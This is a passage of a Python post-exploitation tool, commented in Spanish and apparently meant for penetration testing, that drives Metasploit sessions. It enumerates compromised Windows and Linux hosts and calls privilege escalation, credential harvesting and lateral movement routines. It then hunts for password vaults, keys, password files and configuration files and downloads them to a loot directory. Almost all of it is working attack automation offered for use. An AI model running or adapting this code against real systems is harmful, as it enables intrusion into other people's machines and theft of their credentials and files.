            if session_info['type'] == 'meterpreter':
                sysinfo_output = self.run_command_on_session(session_id, "sysinfo")
                result['system_info']['sysinfo'] = sysinfo_output
                
                # Extraer información adicional
                if "windows" in platform:
                    result['system_info']['hostname'] = self.run_command_on_session(session_id, "hostname")
                    result['system_info']['ipconfig'] = self.run_command_on_session(session_id, "ipconfig")
                    result['system_info']['users'] = self.run_command_on_session(session_id, "net user")
                else:
                    result['system_info']['hostname'] = self.run_command_on_session(session_id, "hostname")
                    result['system_info']['ifconfig'] = self.run_command_on_session(session_id, "ifconfig || ip a")
                    result['system_info']['users'] = self.run_command_on_session(session_id, "cat /etc/passwd")
            else:
                # Para sesiones shell
                if "windows" in platform:
                    result['system_info']['hostname'] = self.run_command_on_session(session_id, "hostname")
                    result['system_info']['systeminfo'] = self.run_command_on_session(session_id, "systeminfo")
                    result['system_info']['ipconfig'] = self.run_command_on_session(session_id, "ipconfig")
                    result['system_info']['users'] = self.run_command_on_session(session_id, "net user")
                else:
                    result['system_info']['hostname'] = self.run_command_on_session(session_id, "hostname")
                    result['system_info']['uname'] = self.run_command_on_session(session_id, "uname -a")
                    result['system_info']['ifconfig'] = self.run_command_on_session(session_id, "ifconfig || ip a")
                    result['system_info']['users'] = self.run_command_on_session(session_id, "cat /etc/passwd")
            
            # 1. Escalada de privilegios
            if self.config.get("post_modules", {}).get("privilege_escalation", True):
                logger.info(f"Iniciando escalada de privilegios en sesión {session_id}")
                priv_esc_result = self.perform_privilege_escalation(session_id, target_info)
                result['privilege_escalation'] = priv_esc_result
                
                # Si se obtuvo una nueva sesión con privilegios, usar esa para el resto de tareas
                if priv_esc_result.get("success", False) and priv_esc_result.get("elevated_session"):
                    logger.info(f"Usando nueva sesión con privilegios: {priv_esc_result['elevated_session']}")
                    session_id = priv_esc_result['elevated_session']
            
            # 2. Recolección de credenciales
            if self.config.get("post_modules", {}).get("credential_harvesting", True):
                logger.info(f"Iniciando recolección de credenciales en sesión {session_id}")
                cred_result = self.harvest_credentials(session_id, target_info)
                result['credentials'] = cred_result
            
            # 3. Movimiento lateral (solo si hay credenciales disponibles)
            if (self.config.get("post_modules", {}).get("lateral_movement", True) and 
                result['credentials'] and 
                result['credentials'].get("credentials_found")):
                
                logger.info(f"Iniciando movimiento lateral desde sesión {session_id}")
                lateral_result = self.perform_lateral_movement(
                    session_id, 
                    target_info, 
                    result['credentials'].get("credentials_found", [])
                )
                result['lateral_movement'] = lateral_result
            
            # 4. Recolección de archivos interesantes
            interesting_files = []
            
            if "windows" in platform:
                interesting_paths = [
                    "C:\\Users\\*\\Desktop\\*.doc*",
                    "C:\\Users\\*\\Desktop\\*.xls*",
                    "C:\\Users\\*\\Desktop\\*.pdf",
                    "C:\\Users\\*\\Desktop\\*pass*",
                    "C:\\Users\\*\\Desktop\\*cred*",
                    "C:\\Program Files\\*\\*config*.xml",
                    "C:\\inetpub\\wwwroot\\web.config"
                ]
                
                # Utilizar comando dir para encontrar archivos
                for path in interesting_paths:
                    # Escapar caracteres especiales para cmd
                    escaped_path = path.replace("\\", "\\\\")
                    
                    if session_info['type'] == 'meterpreter':
                        file_output = self.run_command_on_session(session_id, f"dir {escaped_path}")
                    else:
                        file_output = self.run_command_on_session(session_id, f"dir {path}")
                    
                    # Extraer rutas de archivos encontrados
                    if file_output and "File Not Found" not in file_output:
                        file_lines = file_output.splitlines()
                        for line in file_lines:
                            if "Directory of" not in line and ("<DIR>" not in line or "bytes free" not in line):
                                if ".exe" not in line and (".dll" not in line):
                                    parts = line.strip().split()
                                    if len(parts) >= 4:
                                        filename = parts[-1]
                                        if "." in filename:
                                            interesting_files.append(filename)
            else:
                # Linux: usar find para archivos interesantes
                interesting_commands = [
                    "find /home -name '*.kdbx' -type f -size -10M 2>/dev/null",
                    "find /home -name '*.key' -type f -size -10M 2>/dev/null",
                    "find /home -name '*.txt' -type f -size -10M 2>/dev/null | grep -i password",
                    "find /var/www -name 'config*' -type f -size -10M 2>/dev/null",
                    "find /etc -name '*.conf' -type f -size -10M 2>/dev/null | grep -i database"
                ]
                
                for command in interesting_commands:
                    file_output = self.run_command_on_session(session_id, command)
                    
                    # Extraer rutas de archivos encontrados
                    if file_output and "No such file" not in file_output:
                        for line in file_output.splitlines():
                            if line.strip():
                                interesting_files.append(line.strip())
            
            # Recolectar hasta 10 archivos pequeños
            max_files = 10
            files_collected = []
            
            for file_path in interesting_files[:max_files]:
                # Comprobar tamaño del archivo
                if session_info['type'] == 'meterpreter':
                    size_check = self.run_command_on_session(session_id, f"ls -l \"{file_path}\"")
                    
                    # Extraer tamaño
                    size_mb = 0
                    if size_check:
                        size_match = re.search(r"\s+(\d+)\s+", size_check)
                        if size_match:
                            size_bytes = int(size_match.group(1))
                            size_mb = size_bytes / (1024 * 1024)
                else:
                    # Para shell, intentar obtener tamaño
                    if "windows" in platform:
                        size_check = self.run_command_on_session(session_id, f"dir \"{file_path}\"")
                    else:
                        size_check = self.run_command_on_session(session_id, f"ls -l \"{file_path}\"")
                    
                    # Extraer tamaño (aproximado)
                    size_mb = 0
                    if size_check:
                        size_match = re.search(r"\s+(\d+)\s+", size_check)
                        if size_match:
                            size_bytes = int(size_match.group(1))
                            size_mb = size_bytes / (1024 * 1024)
                
                # Descargar si el tamaño es adecuado
                max_size_mb = self.config.get("max_file_size_mb", 10)
                
                if size_mb < max_size_mb:
                    logger.info(f"Descargando archivo: {file_path}")
                    
                    # Nombre de archivo local
                    filename = os.path.basename(file_path)
                    if not filename:
                        filename = f"file_{len(files_collected)}"
                    
                    local_path = f"{self.config.get('loot_directory')}/{filename}"
                    
                    # Descargar archivo
                    download_success = self.download_file_from_session(session_id, file_path, local_path)
                    
                    if download_success:
                        files_collected.append({
                            "remote_path": file_path,
                            "local_path": local_path,
                            "size_mb": size_mb
                        })
            
            result['files_collected'] = files_collected
        
        except Exception as e:
            logger.error(f"Error en post-explotación: {str(e)}")
            result['post_exploitation_info']['error'] = f"Error: {str(e)}"
        
        # Calcular duración
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        result['post_exploitation_info']['duration'] = duration
        logger.info(f"Post-explotación finalizada. Duración: {duration} segundos")
        
        # Guardar resultados
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(result, f, indent=2)
            logger.info(f"Resultados guardados en {output_file}")
        
        return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Herramienta de post-explotación con técnicas de evasión')
    parser.add_argument('-s', '--session', required=True, help='ID de sesión de Metasploit')
    parser.add_argument('-t', '--target', help='Información del objetivo en formato JSON')
    parser.add_argument('-o', '--output', help='Archivo de salida para resultados JSON')
    parser.add_argument('-c', '--config', default='/opt/pentest/config/post-config.json', 
                        help='Archivo de configuración personalizado')
    
    args = parser.parse_args()
    
    # Cargar datos del objetivo si se proporciona
    target_info = None
    if args.target:
        try:
            with open(args.target, 'r') as f:
                target_info = json.load(f)
        except Exception as e:
            logger.error(f"Error al cargar archivo del objetivo: {str(e)}")
    
    # Crear directorio de salida si no existe
    if args.output:
        os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    
    post_exploitation = PostExploitation(args.config)
    post_exploitation.execute_post_exploitation(args.session, target_info, args.output)